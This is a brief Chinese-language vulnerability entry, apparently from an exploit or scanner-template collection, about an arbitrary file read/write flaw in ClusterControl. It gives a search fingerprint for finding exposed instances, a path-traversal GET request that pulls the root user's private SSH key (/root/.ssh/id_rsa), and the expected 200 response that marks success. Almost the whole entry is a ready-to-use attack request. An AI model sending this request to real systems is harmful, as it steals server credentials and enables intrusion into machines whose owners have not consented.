# ClusterControl存在任意文件读取漏洞

ClusterControl ｜ 任意文件读取/写入 ｜ —
- **指纹**：`title=="ClusterControl v2"`
- **请求**：`GET /../../../../../../../../..//root/.ssh/id_rsa HTTP/1.1`
- **响应特征**：200